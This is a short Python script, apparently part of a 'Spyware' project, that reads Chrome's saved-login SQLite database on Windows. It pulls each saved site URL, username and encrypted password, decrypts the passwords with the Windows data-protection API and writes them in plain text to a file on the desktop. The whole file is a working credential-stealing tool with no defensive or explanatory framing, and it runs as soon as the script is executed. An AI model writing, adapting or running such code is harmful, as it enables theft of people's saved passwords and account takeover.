#!/usr/bin/env python
import csv
from os.path import expanduser
import sqlite3
import time, datetime
import win32crypt
import winshell

"""
This script accesses the login data sqlite 3 database for the chrome browser using sqlite3 library
and gets the urls' username and password. The passwords are encrypted so it decrypt them and writes
the results in a txt file
"""
def start():
    try:
        # the place where Chrome stores its history 
        login_DB='~/AppData/Local/Google/Chrome/User Data/Default/Login Data'

        # open destination database
        conn = sqlite3.connect(expanduser(login_DB))
        # get a data cursor to work with the database
        c = conn.cursor()
            
        """ list existing history in chrome """
        #result = c.execute("SELECT name from sqlite_master where type='table';") # get table names from database
        #result = c.execute("PRAGMA table_info(logins);") # get column names from table
        result = c.execute("SELECT origin_url, username_value, password_value from logins;")

        login_data = result.fetchall()

        #URL: credentials dictionary
        credential = {}

        #decrytping the password
        for url, user_name, pwd, in login_data:
            try:
                pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0) #Tuple
                credential[url] = (user_name, pwd[1])
            except Exception:
                continue

        # specify destination path of file I will write the results to
        dest_path = winshell.desktop() + r"\Spyware\Output"
        dest_path = dest_path.replace('\\','/') + "/logins.txt"

        f = open(dest_path, 'w+', encoding="utf-8")

        data = ""
        # iterate through the dictionary and write it to the file
        for element in credential:
            try:
                data += element + " " + str(credential[element][0]) + " " + str(credential[element][1]) + "\r\n"
                f.write(data)
            except Exception:
                continue

        f.close()
    except Exception:
        print("Failed")

start()